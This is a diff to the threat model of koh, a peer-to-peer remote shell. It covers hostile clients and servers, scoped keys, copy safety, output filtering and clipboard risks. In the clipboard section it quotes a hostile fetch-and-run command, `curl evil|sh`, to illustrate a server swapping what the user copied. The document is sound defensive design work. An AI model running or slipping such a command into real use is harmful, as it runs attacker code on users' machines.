@@ -7,7 +7,10 @@ look; pair it with [`SECURITY.md`](../SECURITY.md).
 ## What koh is
 
 A mosh-like remote shell over [iroh](https://iroh.computer) (peer-to-peer QUIC). The **server** spawns
-a real shell in a PTY and sends its screen to a **client** as frames over QUIC streams.
+a real shell in a PTY, keeps its screen in an emulator of its own that answers the program's
+questions, and relays the program's output to a **client**, which writes it to the user's terminal
+as ssh would, less those questions. The same connection and allowlist also run commands, jobs and
+copies.
 A peer finds a server by its Ed25519 **node-id** (through relays + NAT hole-punching), and only peers
 on its **allowlist** are admitted. The node-id is not enumerable, but the server's UDP port is open
 like any listener's: anyone who can reach it can start QUIC handshakes, as iroh answers a
@@ -25,106 +28,133 @@ service.
 ## Attacker models
 
 1. **Malicious / compromised client** — a peer that dials the server. If it is on the allowlist it
-   makes one opening request (`src/request.rs`: a shell, its sessions' listing, a command or a
-   copy) and reaches what it asks. Nothing is attached or started before the request, which must
+   makes one opening request (`src/request.rs`: a shell, its sessions' listing or a session's text,
+   a command, a job and the requests on jobs, a wait, or a copy) and reaches what it asks, as far as
+   its key's scope lets it (below). Nothing is attached or started before the request, which must
    come within 10 s, holding the connection's permit meanwhile, and decode whole: an opening
-   request of at most 1 MiB, a command line of at most 256 KiB with no NUL, paths of at most 4096
-   bytes with no NUL, at most 1024 sources, each refused as it is decoded, before anything is
-   allocated for it. A shell reaches the koh/7 data plane: it sends arbitrary input, resize, ack
-   and resync messages and opens streams. Input comes as decoded events (`Keys`: keys, mouse events, focus changes, whole
-   pastes); decoding refuses what no terminal sends (a modifier bit no key has, a function key past
-   F12, a kitty code that is no Unicode scalar, a paste over 1 MiB, more than 512 events, more than
-   16 palette entries in `Colours`) and closes the connection, refusing a sequence past its bound
-   before allocating for it. The server encodes events with fux-vt for the program's modes; a paste
-   is framed whole with its end markers removed, so even a hostile client cannot end a program's
-   bracketed paste early, nor leave one open (it can type anything else, as any client can).
-   **Commands, copies and listings** are as powerful as a shell (a shell can run any command and
-   write any file), so they are for exactly the clients allowed a shell, through the same gate,
+   request of at most 1 MiB, a command of at most 256 KiB and 4096 words with no NUL, paths of at
+   most 4096 bytes with no NUL, at most 1024 sources, a job's name a short word, a wait's text at
+   most 4 KiB, each refused as it is decoded, before anything is allocated for it. A shell reaches
+   the koh/8 data plane: it sends input, resizes, colours, its reads of the output (`Read`, which
+   pace what the server sends) and redraw requests. Input comes as decoded events (`Keys`: keys,
+   mouse events, focus changes, whole pastes); decoding refuses what no terminal sends (a modifier
+   bit no key has, a function key past F12, a kitty code that is no Unicode scalar, a paste over
+   1 MiB, more than 512 events, more than 16 palette entries in `Colours`) and closes the
+   connection, refusing a sequence past its bound before allocating for it. The server encodes
+   events with fux-vt for the program's modes; a paste is framed whole with its end markers
+   removed, so even a hostile client cannot end a program's bracketed paste early, nor leave one
+   open (it can type anything else, as any client can). What the server sends a client waits for
+   that client's reads: at most 4 MiB unread, and a client that reads nothing gets nothing more
+   (its session's other clients, and the program, go on); a client too far behind is sent a redraw
+   of the screen, not the backlog, so no client makes the server keep its output.
+   **Commands, jobs, waits, copies and listings** are as powerful as a shell (a shell can run any
+   command and write any file), so a key with no scope gets all of them, through the same gate,
    permits and request; what they make the server hold is bounded per connection, and connections
    by `--max-connections`. A command (`koh exec`) is one process group, with no terminal, run as
-   the server's user: its stdin is read from the stream a chunk at a time and its output written a
-   chunk at a time, so the pipes and QUIC's flow control hold back whichever end is slow; a lost
-   connection, revocation or shutdown hangs it up (SIGHUP to the group, SIGKILL after a second).
-   A copy holds one file open, a chunk of 64 KiB, an item of at most 8 KiB and, sending a tree, a
-   descriptor for each directory it is in, at most 128 directories deep. Landing one, every name is
-   one entry (no `/`, NUL, `.` or `..`), every entry is created anew (`O_EXCL`, `mkdir`) inside a
-   directory the same copy created, so no name the client sends reaches outside its target or
-   through a symlink, whatever symlinks the copy itself brings; each top-level item is staged
-   under a hidden name and renamed into place whole, and a copy cut short, malformed or failed
-   removes what it staged. A listing holds the peer's sessions only (another peer's are never
-   named, nor attachable by number: `NoSuchSession`), each title cut to 256 characters.
-   **Goal it must be denied:** crash / OOM / hang the server, bypass a cap, or escape the admission
-   gauntlet. The server is the high-value target (it runs a shell).
+   the server's user, its words passed to the program as they are (a shell only for `--sh`): its
+   stdin is read from the stream a chunk at a time and its output written a chunk at a time, so
+   the pipes and QUIC's flow control hold back whichever end is slow; a lost connection (20 s
+   after its client went silent), revocation or shutdown hangs it up (SIGHUP to the group, SIGKILL
+   after a second). A job (`koh run`) is a command that outlives its connection: at most 64 are
+   kept, all peers' together, each a peer's own (another peer's are never named), with stdin
+   `/dev/null`, its output kept in a log of the newest `--job-log-bytes` (a job's log of 4 MiB by
+   default and at most 64 MiB, held at most twice over), hung up when the server stops, and
+   forgotten once ended for the session TTL. A wait holds its connection and nothing else, and
+   ends with it.
+   A copy is a sync: the sender says each entry, and the receiver answers what it needs of each
+   file (all of it, the rest of a part it kept, or nothing when its hash matches), at most 64
+   files unanswered. It holds one file open, a chunk of 64 KiB, an item of at most 8 KiB and, for
+   a tree, a descriptor for each directory it is in, at most 128 directories deep; at most 4
+   million names seen and a million renames or removals deferred. Landing one, every name is one
+   entry (no `/`, NUL, `.` or `..`), and every directory on the way is opened from the one above
+   it by its descriptor with `O_NOFOLLOW` (the destination's own path is followed as the user
+   gave it), so no name the peer sends reaches outside the destination or through a symlink,
+   whatever symlinks are already there or the copy brings. A file is written under a hidden
+   `.koh-….part` name beside its target and renamed into place once whole (with `--atomic`, all
+   of them only once the whole copy came); a part a cut copy left is resumed by the next. A file
+   lands with its mode less setuid and setgid, which no copy gives, so a peer cannot leave a
+   program that runs as the server's user for whoever starts it. `--delete` removes, beneath the
+   destination, what the source does not have, once the source said all a directory holds.
+   **Scoped keys** (`koh clients add NAME ID --cp DIR`, `--exec DIR`) get only what their scope
+   names: `cp` copies to and from paths beneath `DIR` (an absolute path outside it, `~`, or `..`
+   is refused, and a symlink beneath it is never followed), and waits for a file there; `exec`
+   commands and jobs, started in `DIR` (its real path checked to be beneath it). Neither gets a
+   shell, a session's listing or text, or another scope's requests (`Close::OutOfScope`). An exec
+   scope is not a sandbox: a command reaches what the server's user can.
+   A listing holds the peer's sessions or jobs only (another peer's are never named, nor reached
+   by number or name: `NoSuchSession`, `NoSuchJob`), each title cut to 256 characters.
+   **Goal it must be denied:** crash / OOM / hang the server, bypass a cap or its scope, or
+   escape the admission gauntlet. The server is the high-value target (it runs a shell).
 2. **Malicious / compromised server** — a server a client dials (a wrong/typo'd node-id, or a popped
-   host). It sends arbitrary screen-state instructions + out-of-band data (title/icon/bell/clipboard).
-   **Goal it must be denied:** crash / OOM / hang the client, or leave lasting state in the user's
-   terminal (its palette, modes, keyboard flags). It *can* mislead a user who chose to connect to
-   it — that is inherent, and with no second factor the node-id is the only thing tying a session
-   to a specific server, so node-ids should be verified out-of-band.
+   host). It sends the program's output, shell marks, state reports, the title, the bell and the
+   input modes.
+   **Goal it must be denied:** crash / OOM / hang the client, make the user's terminal answer it
+   anything, or leave lasting state in the user's terminal once koh exits (its palette, modes,
+   keyboard flags). While koh runs, the server writes to the user's terminal as a program run
+   over ssh does: it can draw anything there, set modes and colours, as any program the user runs
+   can. It *can* mislead a user who chose to connect to it — that is inherent, and with no second
+   factor the node-id is the only thing tying a session to a specific server, so node-ids should be
+   verified out-of-band.
+   **What reaches the user's terminal:** the client reads every byte the server sends through a
+   filter of its own (`src/stream.rs`) before writing it: it drops every question a terminal
+   answers (device attributes, cursor and status reports, DECRQM, XTVERSION, the kitty keyboard
+   flags, colour and palette queries, DECRQSS, XTGETTCAP, window reports, the locator, ENQ,
+   DECID), so a server cannot make the user's terminal type anything; it drops every shell mark
+   (OSC 133) in the output, writing only those the server relays apart, with the nonce the
+   user's terminal asks for, so a server's program cannot fake one; and it gathers a sequence
+   whole before judging it, at most a control string of at most 1 MiB, a control sequence of at
+   most 256 bytes, a longer one dropped to its end. Titles pass cut to 256 characters with no
+   control in them. The client also feeds what it writes to a fux-vt parser of its own (the
+   terminal's mirror, for prediction), which is panic-free by construction and bounded, with no
+   history. On leaving, and on a suspend, the client puts back every mode the program set (the
+   alternate screen, mouse reporting, bracketed paste, focus reports, the cursor, keypad and
+   cursor-key modes, margins, kitty keyboard flags pushed, the pen, an open link) and resets the
+   palette and the dynamic colours. A message from the server is at most 17 KiB, its output in
+   pieces of at most 16 KiB; a malformed one closes the connection, and the client redials.
    **The clipboard:** clipboard writes (OSC 52) are on by default, by the owner's choice, so a
    remote program's copy works. A hostile server can therefore replace what the user copied (a
    command swapped for `curl evil|sh`); `koh connect --no-clipboard` turns them off, and a user
    who does not trust the server should pass it. What bounds them: only base64 of at most 16 KiB is
-   forwarded, always to the `c` selection; the clipboard is never read (a query, `OSC 52 ; c ; ?`,
-   is neither forwarded nor answered, and the client asks the user's terminal nothing), so nothing
-   the user copied reaches the server.
+   passed; the clipboard is never read (a query, `OSC 52 ; c ; ?`, is neither passed nor
+   answered), so nothing the user copied reaches the server.
    **Hyperlinks:** links (OSC 8) are on by default, by the owner's choice, and off with
    `koh connect --no-hyperlinks`. A server chooses the URI, so a link can point anywhere, as a link
-   in any program's output can; the user's terminal shows it before opening it. What bounds them:
-   on the wire a row carries at most 64 links, a URI at most fux-vt's 2,083 bytes and an id 250,
-   and a frame at most 1 MiB of them (a frame over it is dropped whole), so a hostile server cannot
-   make the client keep much; and before painting one the client checks it again (printable ASCII,
-   no space, an id without `;` or `:`), painting a link that fails as plain text, so no escape
-   sequence can ride in a URI.
+   in any program's output can; the user's terminal shows it before opening it, and bounds it as
+   it bounds any program's.
    **Typed secrets:** the client predicts typing locally; at a password prompt (the PTY reads
    lines without echo, which the server reads from its modes and tells the client) nothing typed
    is predicted or shown, whatever trust the session had. The client's copy of the modes can lag
    the PTY's by up to the server's 100 ms read interval (a program that prints its prompt, then
-   turns echo off): so a key typed within 200 ms of a frame that moved the cursor to another row
-   (a fresh prompt) is not predicted until the server has reflected it, and a secret typed at
-   once is not drawn either. A hostile server can of course claim any modes: it already sees
-   every key.
-   **History:** the server already holds the session's history (`--scrollback-bytes`, 8 MiB by
-   default); with the scrollback view the client now holds a part of it too, in memory, for the
-   connection: at most `HISTORY_CACHE_BYTES` (64 MiB of fux-vt's storage), only replies to requests
-   it has outstanding (matched by id), dropped when the connection ends. A server's history
-   rows are decoded like a frame's rows (the same refusals), at most 256 rows and 65,536 cells a
-   reply and 1 MiB of links, a malformed reply dropped whole; rows the screen's history mark does
-   not name are not kept. A hostile client cannot make the server send more than its history, nor
-   faster than the link takes: requests are answered one at a time, each once the last is
-   delivered, and more than 8 waiting closes the connection.
+   turns echo off): so a key typed soon after the cursor moved to another row (a fresh prompt) is
+   not predicted until the server has reflected it, and a secret typed at once is not drawn
+   either. A hostile server can of course claim any modes: it already sees every key.
+   **History:** the server holds the session's history (`--scrollback-bytes`, 8 MiB by
+   default); a client attaching afresh is sent up to 1000 rows of it, which land in the user's
+   terminal's own scrollback, as output does.
    **Questions to the user's terminal:** the client asks it one set of questions, itself, once at
-   start-up (`client::probe`: whether it draws underline styles, whether it speaks the kitty
-   keyboard protocol, its colour scheme, its foreground, background and palette entries 0 to 15, and
-   its device attributes), and reads the answers out of stdin before the session starts. It asks
-   the colours again only when its own terminal reports a new scheme (mode 2031). Nothing a server
-   sends makes the client ask the terminal anything.
+   start-up (`client::probe`: its colour scheme, its foreground, background and palette entries 0
+   to 15, and its device attributes), and reads the answers out of stdin before the session
+   starts. It asks the colours again only when its own terminal reports a new scheme (mode 2031).
+   Nothing a server sends makes the client ask the terminal anything.
    **The user's colours:** unless `koh connect --no-colours`, the client tells the server the
    colours its terminal answered (`Colours`: foreground, background, palette 0–15, dark or light),
    on every connection; the server answers programs' OSC 10, OSC 11, OSC 4 for entries 0–15 and
-   `CSI ? 996 n` from them, so
-   vim, bat and delta pick a matching theme. That tells the server the user's theme, a small
-   fingerprint, to a server the user chose to connect to; the answers go to the program, never to
-   the user's terminal, and a program asking a thousand times is answered from the server's copy,
-   never by asking the user's terminal again. The underline and keyboard answers stay on the
-   client.
-   **The user's terminal's modes:** the client sets them itself and resets them on leaving and on
-   suspend: bracketed paste and focus reporting while it runs (so pastes arrive whole and focus
-   changes at all), mouse reporting in SGR while the program asks for any or the scrollback view is
-   open, kitty's disambiguate and alternate keys pushed (`CSI > 5 u`, popped with `CSI < u`) if
-   the terminal speaks the protocol, and scheme reports (mode 2031) if it reports a scheme. A
-   server's modes are no longer mirrored for their own sake: nothing it sends sets the user's
-   keyboard flags or leaves a mode set.
-   **`koh exec`'s output** is the command's, written to the user's stdout and stderr as it came,
-   as ssh writes it: a hostile server can write escape sequences to a terminal the user left them
-   on, as any program the user runs can. Nothing else of the server's reaches them raw: a listing's
-   titles are escaped, and a server's error is a close code or a copy's failure kind, its path
-   shown escaped.
+   `CSI ? 996 n` from them, so vim, bat and delta pick a matching theme. That tells the server
+   the user's theme, a small fingerprint, to a server the user chose to connect to; the answers go
+   to the program, never to the user's terminal, and a program asking a thousand times is
+   answered from the server's copy, never by asking the user's terminal again.
+   **`koh exec`'s and a job's output** is the command's, written to the user's stdout and stderr
+   as it came, as ssh writes it: a hostile server can write escape sequences to a terminal the user
+   left them on, as any program the user runs can. `koh output` prints a session's text, which
+   the server's emulator made: printable characters and line breaks only. Nothing else of the
+   server's reaches them raw: a listing's titles and commands are escaped, `--json` escapes what
+   it says, and a server's error is a kind and an escaped message.
    **`koh cp` from a server** lands what the server sends under the rules a server lands a
-   client's copy by (above): only inside the destination the user named, never merging into a
-   directory there, staged until whole. The server chooses the names, modes (setuid included, as
-   `cp -p` keeps them) and symlink targets in the tree it sends, and how much of it: a user who does
-   not trust the server copies from it into a directory of its own.
+   client's copy by (above): only beneath the destination the user named, through no symlink,
+   with no setuid or setgid bit, each file whole. The server chooses the names, modes and symlink
+   targets in the tree it sends, and how much of it, and with `--delete` what is removed beneath
+   the destination: a user who does not trust the server copies from it into a directory of its
+   own.
 3. **Network / MITM** — QUIC + TLS 1.3 (via iroh) give transport encryption and node-id
    authentication by construction (no TOFU window). Considered: replay, and connection-level tamper.
 4. **Local attacker** — another uid on the same host. Targets: the identity key file, the state dir,
@@ -138,28 +168,23 @@ service.
   there is no passphrase/PAKE second factor. A leaked key file is a leaked identity: protect it
   like an SSH private key, and remove a lost machine's id from every allowlist (`koh clients rm`,
   which a running server heeds within 2 s, closing that peer's connections, which hangs up any
-  command it runs, and ending all of its sessions, and any `--allow`, which needs a restart). A saved list that cannot be read keeps the last one
+  command it runs, and ending all of its sessions (a scope changed closes its connections too), and any `--allow`, which needs a restart). A saved list that cannot be read keeps the last one
   read well, so a typo in it disconnects no one. The saved allowlist, `clients` beside the server key, is held to the key's own
   rules (`src/identity/key_file.rs`): a symlink, a hard-linked file or another user's file is
   refused and a loose mode tightened, since whoever can write it can let a peer in. The accept gauntlet (`src/server/cli.rs`) is the trust-boundary
   checkpoint; its outcomes are logged structured under the `koh::auth` target.
-- **Untrusted data plane:** the protocol (`src/proto.rs`) and the connection cores
-  (`src/server/mod.rs`, `src/client/session.rs`) are pure and panic-free by construction. Client
-  messages are length-capped (about 1.06 MiB each, `MAX_CLIENT_MESSAGE`: a 1 MiB paste plus
-  64 KiB) and a frame is read and inflated with a 16 MiB limit; each end keeps at most 16 recent screens, holding at most one screen of the largest size
-  beyond the one it needs (a row several share counted once), whatever the peer sends or withholds; QUIC
-  stream limits and flow control bound what a peer can have in flight; and resize dimensions are
-  clamped before any grid allocation.
-  **The client runs no terminal parser on server bytes:** a screen update is a structured diff of
-  whole rows of run-length-encoded cells. Decoding it refuses unknown cell kinds, style bits and
-  modes, empty runs, and cell text over the emulator's per-cell cap or holding a control character
-  (the client prints a cell's text to the user's terminal as is, so it cannot carry an escape
-  sequence); `TerminalScreen::apply` then validates the rest (row indices, runs covering exactly the
-  width) before committing. A malformed frame is dropped whole. The
-  server's emulator is `fux-vt`, which is panic-free by construction (its own `forbid` lints) and
-  bounded: it retains no DCS/APC/PM/SOS payload and caps an OSC string at 64 KiB, so a runaway
-  control string from the shell can't grow memory. koh therefore no longer wraps the emulator in
-  `catch_unwind` or pre-filters control strings.
+- **Untrusted data plane:** the protocol (`src/proto.rs`, `src/request.rs`, `src/sync/`) and
+  the connection cores (`src/server/attach.rs`, `src/client/mod.rs`) are panic-free by
+  construction. Client messages are length-capped (about 1.06 MiB each, `MAX_CLIENT_MESSAGE`: a
+  1 MiB paste plus 64 KiB), and the server's at about 17 KiB; QUIC stream limits and flow control
+  bound what a peer can have in flight, and the server sends a client no more than its reads
+  allow; and resize dimensions are clamped before any grid allocation.
+  **Both ends filter the program's output** (`src/stream.rs`): the server so that its sessions'
+  clients never see a question its own emulator answered, nor a mark the shell did not sign; the
+  client so that a hostile server cannot make the user's terminal answer it either. Each holds at
+  most one sequence (a control string of at most 1 MiB) whatever the output. The server's
+  emulator is `fux-vt`, which is panic-free by construction (its own `forbid` lints) and bounded;
+  the client's mirror of the user's terminal is too, and keeps no history.
 - **Process / local:** `forbid(unsafe)` crate-wide; the identity key is the raw secret, protected
   by its permissions like an SSH host key: written `0600` (born-private atomic write), read with
   `O_NOFOLLOW`, and re-tightened to 0600 through the open descriptor; a state dir owned by another
